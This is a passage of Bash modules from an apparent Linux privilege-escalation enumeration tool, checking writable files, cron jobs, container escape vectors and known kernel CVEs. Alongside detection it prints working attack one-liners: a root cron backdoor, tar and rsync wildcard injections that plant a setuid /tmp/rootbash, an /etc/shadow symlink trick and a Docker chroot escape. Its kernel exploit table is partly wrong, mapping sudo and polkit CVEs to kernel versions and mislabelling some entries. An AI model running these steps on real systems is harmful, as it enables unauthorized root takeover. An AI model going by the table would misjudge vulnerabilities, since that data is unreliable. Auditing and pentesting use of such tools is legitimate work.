        if [ -n "${writable_path_dirs[0]}" ]; then
          print_critical "Creating a malicious version in ${writable_path_dirs[0]} may allow privilege escalation"
        fi
      fi
    fi
  done
}

# Check for writable home directory files
check_home_directory_files() {
  print_subtitle "Writable Home Directory Files"

  print_info "Checking for writable files in home directories..."

  # Check for specific important dot files
  important_dotfiles=(".bashrc" ".bash_profile" ".profile" ".zshrc" ".zshenv" ".zprofile"
                      ".vimrc" ".ssh/config" ".ssh/authorized_keys" ".config/fish/config.fish"
                      ".cshrc" ".tcshrc" ".kshrc")

  current_user=$(whoami)

  for dotfile in "${important_dotfiles[@]}"; do
    if [ -f "$HOME/$dotfile" ] && [ -w "$HOME/$dotfile" ]; then
      print_warning "Writable $HOME/$dotfile found (can be used to maintain persistence)"
    fi
  done

  # Look for writable files owned by other users or root
  if [ "$THOROUGH" ]; then
    print_info "Looking for writable files owned by others or root (may take a while)..."

    other_owned_files=$(find /home -type f -writable ! -user "$current_user" 2>/dev/null | grep -v "/.cache/\|/.config/google-chrome\|/.mozilla/\|/.vscode/\|node_modules/")

    if [ -n "$other_owned_files" ]; then
      print_critical "Found writable files owned by other users:"
      echo "$other_owned_files" | while read -r file; do
        owner=$(ls -la "$file" 2>/dev/null | awk '{print $3}')
        print_critical " ${RED}${file}${NC} [Owner: ${owner}]"
      done
      print_critical "These files can be modified to potentially escalate privileges"
    else
      print_success "No writable files owned by other users found"
    fi
  fi
}

# Check for wildcard exploitation opportunities
check_wildcard_injection() {
  print_subtitle "Wildcard Injection"

  print_info "Checking for wildcard injection opportunities in scripts..."

  # Look for scripts that use wildcards with tar, cp, rsync, etc.
  if [ -d "/etc/cron.daily" ]; then
    wildcard_scripts=$(grep -r -l "\*" /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /usr/local/bin 2>/dev/null | grep -v ".git")

    if [ -n "$wildcard_scripts" ]; then
      print_warning "Found scripts potentially using wildcards:"

      echo "$wildcard_scripts" | while read -r script; do
        if grep -q "tar\s.*\*\|cp\s.*\*\|rsync\s.*\*\|chmod\s.*\*\|chown\s.*\*" "$script" 2>/dev/null; then
          print_critical " ${RED}${script}${NC} (contains wildcards with potentially exploitable commands)"
          print_critical "   Run with: ${RED}wildcard_injection_check${NC} $script"
        else
          print_warning " ${YELLOW}${script}${NC} (contains wildcards)"
        fi
      done

      print_warning "Wildcard injection could be possible if the script runs with higher privileges"
    else
      print_success "No scripts with wildcard usage found"
    fi
  else
    print_not_found "Cron directories not found or not accessible"
  fi
}

# Main function to run all writable files checks
writable_files_checks() {
  print_title "Writable Files & Directories"

  # Run all writable files checks
  check_writable_etc_files
  check_path_hijacking
  check_home_directory_files
  check_wildcard_injection

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/exploit_checks/cron_jobs.sh ---

# Title: Cron Jobs Checker
# Description: Check for insecure cron jobs that can be exploited for privilege escalation
# Author: Jonas Resch

# Check for writable cron job scripts and directories
check_writable_cron_scripts() {
  print_subtitle "Writable Cron Scripts"

  print_info "Searching for writable cron job scripts..."

  # Check standard cron directories
  cron_dirs=(
    "/etc/cron.d"
    "/etc/cron.daily"
    "/etc/cron.hourly"
    "/etc/cron.weekly"
    "/etc/cron.monthly"
    "/var/spool/cron"
    "/var/spool/cron/crontabs"
  )

  # Check if any cron directory is writable
  for dir in "${cron_dirs[@]}"; do
    if [ -d "$dir" ]; then
      if [ -w "$dir" ]; then
        print_critical "${RED}Cron directory is writable: $dir${NC}"
        print_critical " ${RED}→ You can create a new cron job file here!${NC}"
        print_critical " ${RED}→ Example: echo '* * * * * root chmod u+s /bin/bash' > $dir/root-backdoor${NC}"
      fi

      # Look for writable cron job scripts
      find "$dir" -type f 2>/dev/null | while read -r file; do
        if [ -w "$file" ]; then
          perms=$(ls -la "$file" | awk '{print $1}')
          owner=$(ls -la "$file" | awk '{print $3}')

          print_critical "${RED}Writable cron job: $file${NC} [$perms] [Owner: $owner]"
          print_critical " ${RED}→ You can modify this cron job to run your code!${NC}"

          # Get cron job contents
          content=$(head -n 5 "$file" 2>/dev/null)
          if [ -n "$content" ]; then
            print_critical " ${RED}→ Current content (truncated):${NC}"
            echo "$content" | while read -r line; do
              print_critical "   $line"
            done
          fi
        fi
      done
    fi
  done
}

# Check for cron jobs running as root
check_root_cron_jobs() {
  print_subtitle "Root Cron Jobs"

  print_info "Checking for cron jobs running as root..."

  # Check crontab
  if [ -r "/etc/crontab" ]; then
    print_warning "Checking /etc/crontab for root jobs:"
    root_jobs=$(grep -v "^#" /etc/crontab 2>/dev/null | grep -E "root" | grep -Ev "^$")

    if [ -n "$root_jobs" ]; then
      echo "$root_jobs" | while read -r job; do
        # Extract command from the cron job
        cmd=$(echo "$job" | awk '{for(i=7;i<=NF;i++)print $i}' | tr -d "\t" | tr " " "\t" | cut -f 1)

        # Check for wildcards, relative paths, etc.
        if echo "$cmd" | grep -q " \* "; then
          print_critical "${RED}Cron job with wildcard: $job${NC}"
          print_critical " ${RED}→ Wildcard in cron jobs can be exploited:${NC}"
          print_critical " ${RED}→ https://www.hackingarticles.in/linux-privilege-escalation-using-wildcard-injection${NC}"
        elif ! echo "$cmd" | grep -q "^/"; then
          print_critical "${RED}Cron job with relative path: $job${NC}"
          print_critical " ${RED}→ Relative paths can be exploited with PATH manipulation${NC}"
        else
          # Check if the command is writable
          if [ -w "$cmd" ]; then
            print_critical "${RED}Writable root cron job command: $cmd${NC}"
            print_critical " ${RED}→ You can modify this executable to run arbitrary code as root!${NC}"
          else
            # Check for writable command arguments (scripts, config files)
            args=$(echo "$job" | awk '{for(i=8;i<=NF;i++)print $i}')

            for arg in $args; do
              # Skip flags/options
              if [[ "$arg" == -* ]]; then
                continue
              fi

              # Skip variable references and redirections
              if [[ "$arg" == *\$* ]] || [[ "$arg" == *\<* ]] || [[ "$arg" == *\>* ]]; then
                continue
              fi

              # Check if argument exists and is writable
              if [ -e "$arg" ] && [ -w "$arg" ]; then
                print_critical "${RED}Writable root cron job argument: $arg${NC}"
                print_critical " ${RED}→ You can modify this file to execute code when the cron job runs!${NC}"
              fi
            done

            print_warning " ${YELLOW}→ $job${NC}"
          fi
        fi
      done
    else
      print_success "No root jobs found in /etc/crontab"
    fi
  fi

  # Check cron.d directory
  if [ -d "/etc/cron.d" ]; then
    print_warning "Checking /etc/cron.d for root jobs:"

    find /etc/cron.d -type f 2>/dev/null | grep -v ".placeholder" | while read -r cronfile; do
      if [ -r "$cronfile" ]; then
        root_jobs=$(grep -v "^#" "$cronfile" 2>/dev/null | grep -E "root" | grep -Ev "^$")

        if [ -n "$root_jobs" ]; then
          print_warning "Root jobs in $cronfile:"

          echo "$root_jobs" | while read -r job; do
            # Extract command from the cron job
            cmd=$(echo "$job" | awk '{for(i=7;i<=NF;i++)print $i}' | tr -d "\t" | tr " " "\t" | cut -f 1)

            # Check for wildcards, relative paths, etc.
            if echo "$cmd" | grep -q " \* "; then
              print_critical "${RED}Cron job with wildcard: $job${NC}"
            elif ! echo "$cmd" | grep -q "^/"; then
              print_critical "${RED}Cron job with relative path: $job${NC}"
            else
              # Check if the command is writable
              if [ -w "$cmd" ]; then
                print_critical "${RED}Writable root cron job command: $cmd${NC}"
              else
                print_warning " ${YELLOW}→ $job${NC}"
              fi
            fi
          done
        fi
      fi
    done
  fi

  # Check root's personal crontab
  if [ "$IAMROOT" ] && [ -r "/var/spool/cron/crontabs/root" ]; then
    print_warning "Checking root's personal crontab:"

    root_personal_jobs=$(grep -v "^#" /var/spool/cron/crontabs/root 2>/dev/null | grep -Ev "^$")

    if [ -n "$root_personal_jobs" ]; then
      echo "$root_personal_jobs" | while read -r job; do
        # Extract command (different format from /etc/crontab)
        cmd=$(echo "$job" | awk '{for(i=6;i<=NF;i++)print $i}' | tr -d "\t" | tr " " "\t" | cut -f 1)

        # Check for wildcards, relative paths, etc.
        if echo "$job" | grep -q " \* "; then
          print_critical "${RED}Cron job with wildcard: $job${NC}"
        elif ! echo "$cmd" | grep -q "^/"; then
          print_critical "${RED}Cron job with relative path: $job${NC}"
        else
          # Check if the command is writable
          if [ -w "$cmd" ]; then
            print_critical "${RED}Writable root cron job command: $cmd${NC}"
          else
            print_warning " ${YELLOW}→ $job${NC}"
          fi
        fi
      done
    else
      print_success "No jobs found in root's personal crontab"
    fi
  fi
}

# Check for world-writable scripts called by cron jobs
check_path_hijacking_cron() {
  print_subtitle "Cron PATH Hijacking"

  print_info "Checking for cron jobs vulnerable to PATH hijacking..."

  # First, check the PATH settings in crontab
  if [ -r "/etc/crontab" ]; then
    cron_path=$(grep "^PATH" /etc/crontab 2>/dev/null | cut -d= -f2)

    if [ -n "$cron_path" ]; then
      print_warning "Cron PATH in /etc/crontab: ${YELLOW}$cron_path${NC}"

      # Check for writable directories in cron PATH
      IFS=':' read -ra path_dirs <<< "$cron_path"
      for dir in "${path_dirs[@]}"; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
          print_critical "${RED}Writable directory in cron PATH: $dir${NC}"
          print_critical " ${RED}→ You can create executables here that will be run by cron jobs!${NC}"
          print_critical " ${RED}→ Example: create a script with the same name as a command used by cron${NC}"
        fi
      done
    fi
  fi

  # Look for suspicious cron job scripts that use relative paths
  all_cron_files=$(find /etc/cron* /var/spool/cron/crontabs -type f 2>/dev/null)

  if [ -n "$all_cron_files" ]; then
    echo "$all_cron_files" | while read -r cronfile; do
      if [ -r "$cronfile" ]; then
        # Use grep to find lines not starting with # and containing an executable
        # We'll look for all lines except comments, PATH settings, or empty lines
        relative_cmd_jobs=$(grep -v "^#" "$cronfile" 2>/dev/null | grep -v "^PATH" | grep -Ev "^\s*$")

        if [ -n "$relative_cmd_jobs" ]; then
          # Only print the cronfile header if we find actual suspicious commands
          suspicious_found=0

          # Process each line in the cron job file
          echo "$relative_cmd_jobs" | while read -r job; do
            # Determine the file type to parse it correctly
            if echo "$cronfile" | grep -q "/etc/crontab\|/etc/cron.d/"; then
              # System crontab format: min hour dom month dow user command
              user=$(echo "$job" | awk '{print $6}')
              cmd=$(echo "$job" | awk '{for(i=7;i<=NF;i++)print $i}' | tr -d "\t" | tr " " "\t" | cut -f 1)
            else
              # User crontab format: min hour dom month dow command
              user="UNKNOWN"
              cmd=$(echo "$job" | awk '{for(i=6;i<=NF;i++)print $i}' | tr -d "\t" | tr " " "\t" | cut -f 1)
            fi

            # Skip entries that don't look like cron jobs (help text, empty lines, etc)
            if ! echo "$job" | grep -qE "^[0-9*]"; then
              continue
            fi

            # Only check commands that appear to be relative paths
            if [ -n "$cmd" ] && ! echo "$cmd" | grep -q "^/"; then
              # If this is our first suspicious command, print the header
              if [ "$suspicious_found" -eq 0 ]; then
                print_warning "Cron jobs with relative command paths in ${YELLOW}$cronfile${NC}:"
                suspicious_found=1
              fi

              if [ "$user" != "UNKNOWN" ]; then
                print_warning " ${YELLOW}→ [$user] $job${NC}"
              else
                print_warning " ${YELLOW}→ $job${NC}"
              fi

              print_warning "   ${YELLOW}→ Command without absolute path: $cmd${NC}"

              # Try to find the command in the PATH and check if it's writable
              command_path=$(which "$cmd" 2>/dev/null)
              if [ -n "$command_path" ]; then
                if [ -w "$command_path" ]; then
                  print_critical "   ${RED}→ The command $cmd resolves to $command_path, which is writable!${NC}"
                else
                  print_success "   → The command $cmd resolves to $command_path (not writable)"
                fi
              else
                print_warning "   ${YELLOW}→ The command $cmd was not found in PATH, potential for PATH hijacking${NC}"
              fi
            fi
          done
        fi
      fi
    done
  fi
}

# Check for wildcards in cron jobs that can be exploited
check_wildcard_cron() {
  print_subtitle "Wildcard Exploitation"

  print_info "Checking for cron jobs with exploitable wildcards..."

  # Common commands that can be dangerous with wildcards
  dangerous_cmds=("tar" "rsync" "chmod" "chown" "rm")

  # Find cron jobs with wildcards
  all_cron_files=$(find /etc/cron* /var/spool/cron/crontabs -type f 2>/dev/null)

  if [ -n "$all_cron_files" ]; then
    echo "$all_cron_files" | while read -r cronfile; do
      if [ -r "$cronfile" ]; then
        for cmd in "${dangerous_cmds[@]}"; do
          wildcard_jobs=$(grep -v "^#" "$cronfile" 2>/dev/null | grep -E "$cmd .* \*" | grep -Ev "^$")

          if [ -n "$wildcard_jobs" ]; then
            print_critical "${RED}Potentially exploitable wildcard in $cronfile:${NC}"

            echo "$wildcard_jobs" | while read -r job; do
              print_critical " ${RED}→ $job${NC}"

              # Identify the directory containing the wildcard
              job_cmd=$(echo "$job" | sed -E 's/^[^\/]*(\/[^ ]*).*/\1/')
              wildcard_dir=$(echo "$job_cmd" | grep -o ".*\*" | sed 's/\*$//')

              # Check if the wildcard directory is writable
              if [ -d "$wildcard_dir" ] && [ -w "$wildcard_dir" ]; then
                print_critical "   ${RED}→ Directory $wildcard_dir is writable!${NC}"

                if echo "$job" | grep -q "tar"; then
                  print_critical "   ${RED}→ Tar wildcard exploitation:${NC}"
                  print_critical "   ${RED}→ cd $wildcard_dir${NC}"
                  print_critical "   ${RED}→ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > exploit.sh${NC}"
                  print_critical "   ${RED}→ echo '' > \"--checkpoint=1\"${NC}"
                  print_critical "   ${RED}→ echo '' > \"--checkpoint-action=exec=sh exploit.sh\"${NC}"
                  print_critical "   ${RED}→ Wait for the cron job to run, then execute: /tmp/rootbash -p${NC}"
                elif echo "$job" | grep -q "rsync"; then
                  print_critical "   ${RED}→ Rsync wildcard exploitation:${NC}"
                  print_critical "   ${RED}→ cd $wildcard_dir${NC}"
                  print_critical "   ${RED}→ touch \"-e sh -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'\"${NC}"
                  print_critical "   ${RED}→ Wait for the cron job to run, then execute: /tmp/rootbash -p${NC}"
                elif echo "$job" | grep -q "chmod"; then
                  print_critical "   ${RED}→ Chmod wildcard exploitation:${NC}"
                  print_critical "   ${RED}→ cd $wildcard_dir${NC}"
                  print_critical "   ${RED}→ Identify a critical target like /etc/shadow and create a symlink:${NC}"
                  print_critical "   ${RED}→ ln -s /etc/shadow shadow-link${NC}"
                  print_critical "   ${RED}→ Wait for the cron job to run, potentially changing permissions on /etc/shadow${NC}"
                fi
              else
                print_warning "   ${YELLOW}→ Directory $wildcard_dir is not writable${NC}"
              fi
            done
          fi
        done
      fi
    done
  fi
}

# Check for cron files containing credentials
check_cron_credentials() {
  print_subtitle "Credentials in Cron Jobs"

  print_info "Checking for credentials in cron job files..."

  # Find credentials in cron files
  all_cron_files=$(find /etc/cron* /var/spool/cron/crontabs -type f 2>/dev/null)

  if [ -n "$all_cron_files" ]; then
    echo "$all_cron_files" | while read -r cronfile; do
      if [ -r "$cronfile" ]; then
        # Look for various credential patterns
        creds=$(grep -i "pass\=\|passwd=\|password=\|pwd=\|secret=\|token=\|credential=" "$cronfile" 2>/dev/null | grep -v "^#")

        if [ -n "$creds" ]; then
          print_critical "${RED}Potential credentials found in $cronfile:${NC}"

          echo "$creds" | while read -r line; do
            # Try to highlight the credential part
            highlighted_line=$(echo "$line" | sed -E "s/(.*(pass|pwd|user|login|cred|key|secret|token).*[=:\"'].*)([^\s\"':]+)([\"':]?.*)/\\1${RED}\\3${NC}\\4/i")
            print_critical " ${RED}→ $highlighted_line${NC}"
          done
        fi
      fi
    done
  fi
}

# Check for recently modified cron jobs
check_recent_cron_changes() {
  print_subtitle "Recent Cron Changes"

  print_info "Checking for recently modified cron jobs (last 7 days)..."

  # Find recently modified cron files
  recent_changes=$(find /etc/cron* /var/spool/cron/crontabs -type f -mtime -7 2>/dev/null | grep -v ".placeholder")

  if [ -n "$recent_changes" ]; then
    print_warning "${YELLOW}Recently modified cron files:${NC}"

    echo "$recent_changes" | while read -r file; do
      mod_time=$(ls -la "$file" | awk '{print $6, $7, $8}')
      print_warning " ${YELLOW}→ $file (modified: $mod_time)${NC}"

      # Show file contents if readable
      if [ -r "$file" ]; then
        content=$(grep -v "^#" "$file" 2>/dev/null | grep -v "^$" | head -n 5)
        if [ -n "$content" ]; then
          print_warning "   ${YELLOW}→ Content (truncated):${NC}"
          echo "$content" | while read -r line; do
            print_warning "     $line"
          done

          # Indicate if there's more content not shown
          if [ "$(grep -v "^#" "$file" 2>/dev/null | grep -v "^$" | wc -l)" -gt 5 ]; then
            print_warning "     ${YELLOW}→ (more lines not shown)${NC}"
          fi
        fi
      fi
    done
  else
    print_success "No recently modified cron files found"
  fi
}

# Main function to run all cron job checks
cron_job_checks() {
  print_title "Cron Jobs"

  # Run all cron job checks
  check_writable_cron_scripts
  check_root_cron_jobs
  check_path_hijacking_cron
  check_wildcard_cron
  check_cron_credentials
  check_recent_cron_changes

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/exploit_checks/docker_checks.sh ---

# Title: Docker Environment Checker
# Description: Check for Docker/container environment escape vectors
# Author: Jonas Resch

# Detect if running inside a container
detect_container() {
  print_subtitle "Container Detection"

  print_info "Checking if we're running inside a container..."

  IS_CONTAINER=""
  CONTAINER_TYPE=""

  # Check for Docker
  if [ -f /.dockerenv ] || grep -q "docker" /proc/1/cgroup 2>/dev/null; then
    IS_CONTAINER="1"
    CONTAINER_TYPE="Docker"
    print_warning "Running inside a ${YELLOW}Docker container${NC}"
  # Check for LXC
  elif grep -q "lxc" /proc/1/cgroup 2>/dev/null; then
    IS_CONTAINER="1"
    CONTAINER_TYPE="LXC"
    print_warning "Running inside a ${YELLOW}LXC container${NC}"
  # Check for SystemD-nspawn
  elif grep -q "systemd-nspawn" /proc/1/cgroup 2>/dev/null; then
    IS_CONTAINER="1"
    CONTAINER_TYPE="systemd-nspawn"
    print_warning "Running inside a ${YELLOW}systemd-nspawn container${NC}"
  # Check for Kubernetes
  elif [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    IS_CONTAINER="1"
    CONTAINER_TYPE="Kubernetes"
    print_warning "Running inside a ${YELLOW}Kubernetes pod${NC}"
  # Other container indicators
  elif grep -qi "container=\|docker\|lxc\|pod" /proc/1/environ 2>/dev/null; then
    IS_CONTAINER="1"
    CONTAINER_TYPE="Unknown"
    print_warning "Running inside an ${YELLOW}unknown container type${NC}"
  else
    print_success "Not running inside a container"
  fi

  # Check if we're running in a container with increased privileges
  if [ "$IS_CONTAINER" ]; then
    # Check for privileged mode
    if ls -la /dev 2>/dev/null | grep -q "nvidia"; then
      print_critical "${RED}Container appears to be running in privileged mode (nvidia devices exposed)${NC}"
    elif ls -la /dev 2>/dev/null | grep -q "sda"; then
      print_critical "${RED}Container appears to be running in privileged mode (host devices exposed)${NC}"
    elif ip link show 2>/dev/null | grep -q "host0"; then
      print_critical "${RED}Container appears to be running with host networking${NC}"
    fi

    # Check namespace isolation
    if [ -r /proc/1/ns ]; then
      readlink /proc/1/ns/* 2>/dev/null | while read -r line; do
        if echo "$line" | grep -q "init"; then
          print_critical "${RED}Container shares namespace with host! This is insecure.${NC}"
          break
        fi
      done
    fi
  fi
}

# Check for Docker group membership
check_docker_group() {
  print_subtitle "Docker Group Membership"

  print_info "Checking for users in the docker group..."

  # Check if docker group exists
  if grep -q "^docker:" /etc/group 2>/dev/null; then
    # Get members of docker group
    docker_users=$(grep "^docker:" /etc/group 2>/dev/null | cut -d: -f4 | tr ',' '\n')

    if [ -n "$docker_users" ]; then
      print_critical "${RED}Found users in the 'docker' group:${NC}"
      echo "$docker_users" | while read -r user; do
        if [ -n "$user" ]; then
          print_critical " ${RED}→ $user${NC}"
        fi
      done

      print_critical "${RED}Users in the docker group can escalate to root:${NC}"
      print_critical " ${RED}→ docker run -v /:/mnt -it ubuntu chroot /mnt bash${NC}"
    else
      print_success "No users in the 'docker' group"
    fi
  else
    print_success "Docker group not found on the system"
  fi

  # Check if current user can run docker
  if command_exists docker && docker ps >/dev/null 2>&1; then
    print_critical "${RED}Current user can execute docker commands!${NC}"
    print_critical " ${RED}→ This can be used to escalate privileges:${NC}"
    print_critical " ${RED}→ docker run -v /:/mnt -it ubuntu chroot /mnt bash${NC}"
  fi
}

# Check for container escape vectors
check_container_escape_vectors() {
  print_subtitle "Container Escape Vectors"

  if [ ! "$IS_CONTAINER" ]; then
    print_success "Not running in a container, skipping container escape check"
    return
  fi

  print_info "Checking for container escape vectors..."

  # Check for mounted docker socket
  if [ -S /var/run/docker.sock ]; then
    print_critical "${RED}Docker socket is mounted inside the container!${NC}"
    print_critical " ${RED}→ This allows for easy container escape:${NC}"
    print_critical " ${RED}→ Run a container with host root filesystem mounted${NC}"
    ls -la /var/run/docker.sock
  fi

  # Check for volume mounts that may enable escape
  if [ -f /proc/mounts ]; then
    suspicious_mounts=$(grep -E "/ |/etc|/proc|/sys|/var/run|/dev" /proc/mounts | grep -v "^overlay")

    if [ -n "$suspicious_mounts" ]; then
      print_critical "${RED}Found suspicious mounts that might enable container escape:${NC}"
      echo "$suspicious_mounts" | while read -r mount; do
        print_critical " ${RED}→ $mount${NC}"
      done
    fi
  fi

  # Check for dangerous capabilities
  if command_exists capsh; then
    caps=$(capsh --print 2>/dev/null)

    if echo "$caps" | grep -q "cap_sys_admin"; then
      print_critical "${RED}Container has CAP_SYS_ADMIN capability!${NC}"
      print_critical " ${RED}→ This can be used for container escape:${NC}"
      print_critical " ${RED}→ Mount host filesystem and chroot into it${NC}"
    fi

    dangerous_caps=("cap_dac_override" "cap_dac_read_search" "cap_chown" "cap_setuid" "cap_setgid" "cap_net_admin" "cap_net_raw" "cap_sys_module" "cap_sys_ptrace")

    for cap in "${dangerous_caps[@]}"; do
      if echo "$caps" | grep -q "$cap"; then
        print_critical "${RED}Container has $cap capability!${NC}"
      fi
    done
  elif [ -r /proc/self/status ]; then
    # Alternative method if capsh isn't available
    capeff=$(grep "CapEff:" /proc/self/status 2>/dev/null | cut -d: -f2 | tr -d ' ')

    if [ -n "$capeff" ]; then
      # Convert hex to binary and check for specific bits
      capeff_dec=$(printf "%d" "0x$capeff" 2>/dev/null)

      # Check for CAP_SYS_ADMIN (bit 21)
      if [ "$((($capeff_dec >> 21) & 1))" -eq 1 ]; then
        print_critical "${RED}Container has CAP_SYS_ADMIN capability!${NC}"
        print_critical " ${RED}→ This can be used for container escape${NC}"
      fi
    fi
  fi

  # Check for CVE-2019-5736 (runc < 1.0-rc6)
  if [ -f /bin/sh ] && [ -f /proc/self/exe ]; then
    if [ "$CONTAINER_TYPE" = "Docker" ] || [ "$CONTAINER_TYPE" = "Kubernetes" ]; then
      # Indirect way to check for potential vulnerability (not 100% accurate)
      print_warning "${YELLOW}Container might be vulnerable to CVE-2019-5736 (runc container escape)${NC}"
      print_warning " ${YELLOW}→ Affects Docker versions before 18.09.2${NC}"
      print_warning " ${YELLOW}→ https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736${NC}"
    fi
  fi

  # Check for cgroup release_agent escape
  if [ -w /proc/sysrq-trigger ] && [ -d /sys/fs/cgroup/notify_on_release ]; then
    print_critical "${RED}Container vulnerable to cgroup release_agent escape!${NC}"
    print_critical " ${RED}→ https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes${NC}"
  fi

  # Check for unprotected kubectl command
  if command_exists kubectl && [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    if kubectl auth can-i "*" "*" 2>/dev/null | grep -q "yes"; then
      print_critical "${RED}Kubernetes service account has admin privileges!${NC}"
      print_critical " ${RED}→ Can be used to escape to other containers or nodes${NC}"
    fi
  fi
}

# Check for exposed Docker API
check_exposed_docker_api() {
  print_subtitle "Exposed Docker API"

  print_info "Checking for exposed Docker API endpoints..."

  # List of potential Docker API endpoint locations
  api_endpoints=(
    "unix:///var/run/docker.sock"
    "http://localhost:2375"
    "http://127.0.0.1:2375"
    "http://localhost:2376"
    "http://127.0.0.1:2376"
  )

  for endpoint in "${api_endpoints[@]}"; do
    if [[ "$endpoint" == unix://* ]]; then
      # Check for Unix socket
      socket_path=$(echo "$endpoint" | sed 's|unix://||')

      if [ -S "$socket_path" ]; then
        if [ -r "$socket_path" ] && [ -w "$socket_path" ]; then
          print_critical "${RED}Exposed Docker API socket: $socket_path (read/write)${NC}"
          print_critical " ${RED}→ This allows full Docker control, leading to host compromise${NC}"
        elif [ -r "$socket_path" ]; then
          print_warning "${YELLOW}Exposed Docker API socket: $socket_path (readable)${NC}"
          print_warning " ${YELLOW}→ This allows Docker information gathering${NC}"
        fi
      fi
    else
      # Check for HTTP endpoints
      host=$(echo "$endpoint" | cut -d/ -f3 | cut -d: -f1)
      port=$(echo "$endpoint" | cut -d: -f3)

      if nc -zw1 "$host" "$port" 2>/dev/null; then
        print_critical "${RED}Exposed Docker API endpoint: $endpoint${NC}"
        print_critical " ${RED}→ This allows remote Docker control without authentication${NC}"
        print_critical " ${RED}→ Exploit: curl -s $endpoint/containers/json | jq .${NC}"
      fi
    fi
  done
}

# Check for misconfigured Docker
check_docker_configuration() {
  print_subtitle "Docker Configuration"

  print_info "Checking for Docker configuration issues..."

  # Check for Docker daemon with disabled security options
  if [ -r /etc/docker/daemon.json ]; then
    print_warning "Checking Docker daemon configuration..."

    # Look for potentially insecure settings
    if grep -q "\"userns-remap\": \"off\"" /etc/docker/daemon.json || \
       grep -q "\"no-new-privileges\": false" /etc/docker/daemon.json || \
       grep -q "\"selinux-enabled\": false" /etc/docker/daemon.json || \
       grep -q "\"apparmor-profile\": \"\"" /etc/docker/daemon.json || \
       grep -q "\"insecure-registries\"" /etc/docker/daemon.json; then
      print_critical "${RED}Potentially insecure Docker daemon configuration:${NC}"
      grep -E "userns-remap|no-new-privileges|selinux-enabled|apparmor-profile|insecure-registries" /etc/docker/daemon.json | while read -r line; do
        print_critical " ${RED}→ $line${NC}"
      done
    else
      print_success "Docker daemon configuration appears to be secure"
    fi
  fi

  # Check for images with known vulnerabilities
  if command_exists docker && docker ps >/dev/null 2>&1; then
    print_warning "Checking for potentially vulnerable Docker images..."

    # Check for outdated or dangerous base images
    outdated_images=$(docker images 2>/dev/null | grep -E "alpine:|debian:|ubuntu:" | grep -E "latest|old|[0-9]{1,2}\.[0-9]{1,2}$")

    if [ -n "$outdated_images" ]; then
      print_warning "${YELLOW}Potentially outdated Docker images:${NC}"
      echo "$outdated_images" | while read -r line; do
        print_warning " ${YELLOW}→ $line${NC}"
      done
    fi

    # Check for containers running as root (default)
    if docker ps --format "{{.Names}}:{{.Image}}" 2>/dev/null | head -n 5 | while read -r container; do
      user=$(docker inspect --format "{{.Config.User}}" "$(echo "$container" | cut -d: -f1)" 2>/dev/null)
      if [ -z "$user" ] || [ "$user" = "root" ] || [ "$user" = "0" ]; then
        print_warning " ${YELLOW}→ Container running as root: $container${NC}"
      fi
    done; then
      print_warning "${YELLOW}Detected containers running as root - this is less secure${NC}"
    fi
  fi
}

# Main function to run all Docker environment checks
docker_environment_checks() {
  print_title "Docker/Container Environment"

  # Run all Docker/container environment checks
  detect_container
  check_docker_group
  check_container_escape_vectors
  check_exposed_docker_api
  check_docker_configuration

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/exploit_checks/kernel_exploits.sh ---

# Title: Kernel Exploit Checker
# Description: Check for known kernel vulnerabilities and provide exploitation guidance
# Author: Jonas Resch

# Define kernel exploit database with CVE, affected versions, exploit URL and details
declare -A KERNEL_EXPLOITS
KERNEL_EXPLOITS["CVE-2021-4034"]="5.0.0,5.15.0,pkexec Local Privilege Escalation,https://github.com/arthepsy/CVE-2021-4034,High impact polkit vulnerability allowing any unprivileged user to gain root privileges"
KERNEL_EXPLOITS["CVE-2021-3156"]="3.0.0,5.11.0,Sudo Baron Samedit,https://github.com/worawit/CVE-2021-3156,Heap-based buffer overflow in sudo allowing any unprivileged user to gain root privileges"
KERNEL_EXPLOITS["CVE-2021-3560"]="3.0.0,5.13.0,polkit Authentication Bypass,https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation,Race condition in polkit allowing local privilege escalation"
KERNEL_EXPLOITS["CVE-2021-22555"]="2.6.19,5.13.0,Netfilter Heap Out-of-Bounds Write,https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html,Critical vulnerability in Linux Netfilter"
KERNEL_EXPLOITS["CVE-2022-0847"]="5.8.0,5.16.11,Dirty Pipe,https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit,Overwriting data in read-only files"
KERNEL_EXPLOITS["CVE-2022-2586"]="5.5.0,5.18.14,nft_object Use-After-Free,https://www.exploit-db.com/exploits/50896,Kernel privilege escalation via Netfilter"
KERNEL_EXPLOITS["CVE-2022-2588"]="5.5.0,5.18.14,nft_object Double-Free,https://www.openwall.com/lists/oss-security/2022/08/29/5,Kernel privilege escalation via Netfilter"
KERNEL_EXPLOITS["CVE-2019-13272"]="4.10.0,5.1.17,PTRACE_TRACEME,https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272,Local privilege escalation in Linux kernel"
KERNEL_EXPLOITS["CVE-2019-18634"]="2.6.0,6.10.0,Sudo pwfeedback Buffer Overflow,https://github.com/saleemrashid/sudo-cve-2019-18634,Buffer overflow in sudo < 1.8.31 with pwfeedback enabled"
KERNEL_EXPLOITS["CVE-2019-15666"]="2.6.0,5.0.21,xfrm_state UAF,https://github.com/wapiflapi/expl/tree/master/cve-2019-15666,Use-after-free in the XFRM subsystem"
KERNEL_EXPLOITS["CVE-2019-5736"]="N/A,N/A,runc container escape,https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/,Container escape affecting Docker/Kubernetes"
KERNEL_EXPLOITS["CVE-2017-16995"]="4.4.0,4.14.8,get_user/put_user,https://www.exploit-db.com/exploits/45010,eBPF verifier vulnerability"
KERNEL_EXPLOITS["CVE-2017-1000112"]="4.4.0,4.13.1,stack clash,https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112,Race condition with AF_PACKET sockets"
